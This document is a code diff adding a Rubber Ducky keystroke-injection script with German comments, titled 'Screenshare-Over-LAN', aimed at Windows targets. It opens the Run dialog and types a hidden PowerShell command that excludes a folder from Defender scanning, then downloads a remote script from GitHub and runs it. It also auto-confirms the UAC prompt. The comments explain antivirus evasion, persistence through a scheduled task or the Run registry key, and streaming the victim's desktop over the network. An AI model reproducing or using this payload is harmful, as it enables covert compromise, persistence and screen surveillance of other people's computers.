@@ -1,0 +1,62 @@
+REM     Title: Screenshare-Over-LAN
+
+REM     Author: cypherfrog112358
+
+REM     Description: Startet auf dem Ziel-Windows einen HTTP-Server und streamt
+REM     den Desktop in einen Browser auf einem anderen Geraet im selben Netz.
+REM     Aufruf am Client: http://<LAN-IP des Ziels>:8080
+REM     Beenden: ESC auf dem Ziel 5 Sekunden gedrueckt halten.
+
+REM     Target: Windows 10/11
+
+REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/main/Screenshare-Over-LAN-fixed.ps1
+
+REM     WICHTIG - 259-Zeichen-Limit:
+REM     Das Eingabefeld des Windows-Run-Dialogs fasst hoechstens 259 Zeichen,
+REM     danach wird der Text abgeschnitten und der Befehl laeuft unvollstaendig.
+REM     Der folgende Befehl hat 227 Zeichen und muss in EINEN STRING-Block
+REM     (kein Aufteilen, sonst geht die Trennungsstelle kaputt).
+
+REM     So funktioniert der Befehl:
+REM       1. md C:\PS -Force          -> Arbeitsordner anlegen
+REM       2. Add-MpPreference ...     -> Defender/AMSI-Ausnahme NUR fuer
+REM                                      diesen einen Ordner, damit das
+REM                                      Script nicht blockiert wird
+REM                                      (benoetigt Admin, Fehler sind egal)
+REM       3. irm ... -OutFile         -> Payload herunterladen (kein
+REM                                      'irm | iex', das Muster 'Download
+REM                                      und sofort ausfuehren' faellt bei
+REM                                      Defender stark auf)
+REM       4. & C:\PS\x.ps1            -> aus dem ausgenommenen Ordner
+REM                                      starten, dann greift die Ausnahme
+REM                                      auch fuer AMSI
+REM     Das ps1 selbst richtet die Firewall-Regel, die HTTP-URL-Reservierung
+REM     und die Aufloesung der LAN-IP selbst ein.
+
+REM     AUTOSTART: Das ps1 legt beim Start automatisch einen Autostart an -
+REM     zuerst ein Task im Task-Planer (Trigger 'Bei Anmeldung', mit hoechsten
+REM     Rechten, damit beim Anmelden keine UAC-Abfrage kommt und der Task in
+REM     der interaktiven Sitzung laeuft - ein 'Bei Systemstart'-Task laeuft in
+REM     Session 0 und wuerde einen schwarzen Screenshot liefern). Falls der
+REM     Task-Planer nicht zur Verfuegung steht, greift der Registry-Eintrag
+REM     HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+REM     Entfernen: powershell -ExecutionPolicy Bypass -File <pfad>\x.ps1 -RemoveAutostart
+
+REM     UAC-Bestaetigung: nach CTRL-SHIFT ENTER erscheint der UAC-Dialog.
+REM     LEFT bewegt den Fokus auf den linken Button ('Ja'), ENTER bestaetigt.
+REM     Das ist locale-unabhaengig (im deutschen Dialog ist 'Ja' links).
+
+REM     Voraussetzungen am Ziel:
+REM       * angemeldete, interaktive Desktop-Sitzung (kein Lock-Screen)
+REM       * Internetzugang (GitHub Raw)
+REM       * Administratorrechte (Firewall, URL-Reservation, Defender-Ausnahme)
+
+GUI r
+DELAY 1200
+STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/main/Screenshare-Over-LAN-fixed.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
+DELAY 800
+CTRL-SHIFT ENTER
+DELAY 3000
+LEFT
+DELAY 300
+ENTER
